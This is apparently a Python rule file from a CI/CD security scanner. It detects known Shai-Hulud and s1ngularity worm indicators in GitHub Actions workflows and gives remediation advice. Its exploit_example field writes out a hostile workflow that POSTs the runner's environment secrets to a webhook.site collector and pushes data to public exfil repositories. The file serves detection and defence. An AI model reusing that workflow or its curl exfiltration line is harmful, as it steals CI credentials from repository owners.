"""GHA-056. Workflow body contains a known supply-chain worm IOC string."""
from __future__ import annotations

from typing import Any

from ..._context import looks_like_example
from ...base import Finding, Severity, blob_lower
from ...rule import Rule
from .._worm_indicators import lookup as worm_lookup

RULE = Rule(
    id="GHA-056",
    title="Workflow body contains a known supply-chain worm indicator",
    severity=Severity.CRITICAL,
    owasp=("CICD-SEC-1", "CICD-SEC-4"),
    esf=("ESF-D-CODE-INTEGRITY", "ESF-D-INJECTION"),
    cwe=("CWE-506", "CWE-913"),
    recommendation=(
        "Treat this workflow as already-compromised, not at-risk. A "
        "literal worm IOC in the YAML means either the file was "
        "written by a worm payload (Shai-Hulud / s1ngularity), or "
        "someone hard-coded the IOC for a reason that needs a paper "
        "trail. Required steps: (1) preserve the file, do not just "
        "revert it; (2) rotate every credential the runner can reach "
        "(GITHUB_TOKEN-scoped + every secret referenced anywhere in "
        "``.github/``); (3) audit GitHub audit log for the time window "
        "between the IOC appearing and the rotation completing; (4) "
        "check the org for sibling repos with the same IOC (the worm "
        "propagated). If the literal is intentional (a detection "
        "fixture, a red-team exercise), suppress with "
        "``.pipelinecheckignore`` carrying an ``expires:`` date — never "
        "permanently."
    ),
    docs_note=(
        "Distinct from GHA-027 (which fires on behavioral primitives, "
        "reverse shells, base64-decoded exec, exfil-channel domains) "
        "and from GHA-048 / GHA-049 (which fire on the *write* or "
        "*push* primitives). GHA-056 fires on the *literal IOC* — the "
        "filenames, repo names, and webhook UUIDs that surfaced in the "
        "published worm payloads. Currently covers:\n\n"
        "* ``shai-hulud-workflow.yml`` — the workflow file the Shai-"
        "Hulud worm dropped into every writable repo.\n"
        "* Webhook UUID ``bb8ca5f6-4175-45d2-b042-fc9ebb8170b7`` — the "
        "Shai-Hulud webhook.site collector path.\n"
        "* ``Shai-Hulud`` / ``Shai-Hulud Migration`` — the public exfil "
        "repo names the worm created under each victim's account.\n"
        "* ``s1ngularity-repository*`` — the Nx-attack public exfil "
        "repo name pattern.\n\n"
        "The IOC list is curated and append-only, mirroring the shape "
        "of ``_compromised_actions.py`` / ``_compromised_packages.py``. "
        "Refresh by PR with the vendor advisory cited in the commit."
    ),
    known_fp=(
        "Security-training repositories, CTF challenges, and red-team "
        "exercise workflows legitimately carry these IOC strings as "
        "literals. Matches inside YAML keys / HCL attributes whose "
        "names contain ``example``, ``fixture``, ``sample``, ``demo``, "
        "or ``test`` are auto-suppressed; bare literals in a "
        "production workflow still fire.",
        "Detection / threat-intel repos that maintain IOC lists in "
        "checked-in YAML are the expected source of legitimate hits. "
        "Suppress on the specific file with a rationale that names "
        "the repo's purpose.",
    ),
    incident_refs=(
        "Shai-Hulud npm worm (Sept 2025): the worm wrote ``.github/"
        "workflows/shai-hulud-workflow.yml`` into every repo the "
        "stolen GITHUB_TOKEN could reach; the dropped workflow then "
        "POSTed harvested secrets to ``webhook.site/bb8ca5f6-4175-"
        "45d2-b042-fc9ebb8170b7`` and pushed a sibling copy into a "
        "public ``Shai-Hulud`` repo under the victim's account.",
        "Nx s1ngularity compromise (Aug 2025): the malicious "
        "postinstall pushed harvested secrets to public "
        "``s1ngularity-repository*`` repos created under the victim's "
        "account via ``gh repo create``.",
    ),
    exploit_example=(
        "# Vulnerable: the IOC strings below are literal Shai-Hulud /\n"
        "# s1ngularity indicators. A workflow containing any of them\n"
        "# is post-compromise evidence, not pre-compromise risk.\n"
        "name: shai-hulud\n"
        "on: push\n"
        "jobs:\n"
        "  exfil:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - run: |\n"
        "          curl -X POST \\\n"
        "            https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7 \\\n"
        "            -d @<(env)\n"
        "          gh repo create \"$USER/s1ngularity-repository-$RANDOM\" --public\n"
        "          git push \"$USER/Shai-Hulud-Migration\" main\n"
        "\n"
        "# Safe: there is no legitimate version of this workflow.\n"
        "# Delete it, rotate every credential the runner can reach,\n"
        "# and audit the org for sibling drops."
    ),
)


def check(path: str, doc: dict[str, Any]) -> Finding:
    blob = blob_lower(doc)
    raw_hits = worm_lookup(blob)
    hits = [
        (entry, excerpt)
        for entry, excerpt in raw_hits
        # ``looks_like_example`` works on the blob text against an
        # offset; since the registry lookup loses the offset, take a
        # cheap pessimistic shortcut, search the blob once for the
        # excerpt's position and apply the example check there. If
        # the excerpt is not found (unlikely, ``finditer`` produced
        # it), let the hit pass.
        if not looks_like_example(blob, max(0, blob.find(excerpt.lower())))
    ]
    if not hits:
        return Finding(
            check_id=RULE.id, title=RULE.title, severity=RULE.severity,
            resource=path,
            description="No known supply-chain worm IOC strings detected.",
            recommendation="No action required.", passed=True,
        )
    summary = "; ".join(
        f"{entry.name} ({excerpt!r})" for entry, excerpt in hits[:3]
    )
    desc = (
        f"{len(hits)} known worm IOC indicator(s) present. Examples: "
        f"{summary}{'…' if len(hits) > 3 else ''}. A literal worm IOC "
        f"means the workflow is post-compromise evidence; rotate "
        f"credentials and audit the org for sibling drops."
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=path, description=desc,
        recommendation=RULE.recommendation, passed=False,
    )
